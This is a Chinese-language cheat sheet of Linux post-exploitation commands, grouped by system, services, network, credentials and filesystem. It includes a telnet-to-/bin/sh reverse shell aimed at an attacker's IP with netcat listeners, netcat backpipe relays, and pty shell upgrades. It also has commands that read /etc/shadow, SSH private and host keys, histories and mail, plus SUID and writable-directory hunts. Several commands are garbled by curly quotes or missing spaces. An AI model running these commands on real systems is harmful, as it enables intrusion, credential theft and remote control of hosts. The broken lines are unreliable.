Linux 系统信息收集常用命令
0x01 常用命令
1 查看系统版本
cat /etc/issue  
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release

2 查看内核版本
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz

3 查看环境变量里
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set

4  查看是否存在打印机
lpstat -a

0x02 应用与服务
1 查看正在运行的服务以及权限
ps aux
ps -ef
top
cat /etc/service

2 查看具有 root 权限的进程
ps aux | grep root
ps -ef | grep root

3 查看已安装程序、版本及运行状态
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/

4 查看Service 设置
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/

5 查看本机任务计划
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

6 查找可能存有用户名和密码的文本
grep -i user [filename]
grep -i pass [filename]
grep -C 5 “password” [filename]
find . -name “*.php” -print0 | xargs -0 grep -i -n “var $password” # Joomla

0x03 通信与网络
1 查看 NIC 以及连接信息
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network

2 查看网络配置
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

3  查看本机的网络连接信息
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig –list
chkconfig –list | grep 3:on
last

4 查看 ARP 及路由表信息
arp -e
route
/sbin/route -nee

5 嗅探数据包
# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21

6 获得一个 Shell 与系统进行交互
nc -lvp 4444 # Attacker. 输入（命令）
nc -lvp 4445 # Attacker. 输出（结果）
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # 在目标系统上. 使用攻击者的 IP!

7 端口转发（端口重定向）
# fpipe
# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7

#ssh
# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port

#mknod
# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)
mknod
backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc
localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)

9 建立远程 SSH 隧道
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig

0x04 秘密信息和用户
1 查看已登录（在线）账户以及权限设置
id
who
w
last
cat /etc/passwd | cut -d: # List of users
grep -v -E “^#” /etc/passwd | awk -F: '$3 == 0 { print $1}’ # List of super users
awk -F: '($3 == “0”) {print}' /etc/passwd # List of super users
cat /etc/sudoers
sudo -l

2 查看敏感文件
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

3 查看相关目录的隐藏文件
ls -ahlR /root/
ls -ahlR /home/

4 查找密码，脚本，数据库，默认配置文件或日志文件
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg

5 查看操作历史（SSH，nano 等）
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history

6 查找用户信息
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root

7 查找主机上的私钥
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key 

0x05 文件系统
1 查找具备 /etc/ 目录写权限的用户以及重新配置服务的用户
ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/’ 2>/dev/null # Anyone
ls -aRl /etc/ | awk ’$1 ~ /^..w/’ 2>/dev/null # Owner
ls -aRl /etc/ | awk ‘$1 ~ /^…..w/’ 2>/dev/null # Group
ls -aRl /etc/ | awk ’;$1 ~ /w.$/’ 2>/dev/null # Other
find /etc/ -readable -type f 2>/dev/null # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone

2 查找 /var/ 目录的隐藏可疑文件
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases

3 查找网站的隐藏配置文件
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/ 

5 查看相关系统日志
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/
auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,
mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件？log.系统引导……)

6 一句话创建可交互式反弹 Shell
python -c ‘import pty;pty.spawn(“/bin/bash”)’
echo os.system(‘/bin/bash’)
/bin/sh -i

7 挂载文件系统
mount
df -h

8 查看系统挂载情况
cat /etc/fstab

9 高级 Linux 文件权限使用（Sticky bits, SUID 和 GUID）
find / -perm -1000 -type d 2>/dev/null # Sticky bit – Only the owner of the directory or the owner of a file can delete or rename here
find / -perm -g=s -type f 2>/dev/null # SGID (chmod 2000) – run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null # SUID (chmod 4000) – run as the owner, not the user who started it.
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID
for i in `locate -r “bin$”`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2>/dev/null; done #Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin,/usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID(Quicker search)#
findstarting at root (/), SGIDorSUID, not Symbolic links, only 3
folders deep, list with more detail and hideany errors (e.g. permissiondenied)
find/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld {} ;2>/dev/null

10 哪些目录具有写入权限（几个通用的目录：/tmp，/var，/tmp，/dev，/shm）
find / -writable -type d 2>/dev/null # world-writeable folders
find / -perm -222 -type d 2>/dev/null # world-writeable folders
find / -perm -o+w -type d 2>/dev/null # world-writeable folders
find / -perm -o+x -type d 2>/dev/null # world-executable folders
find / ( -perm -o+w -perm -o+x ) -type d 2>/dev/null # world-writeable & executable foldersAny “problem” files？可写的的，“没有使用”的文件
find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable files
find /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files

0x06 准备和查找漏洞利用代码
1 查看语言/代码支持情况
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc

2  查找可利用于传输文件的命令
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
find / -name scp
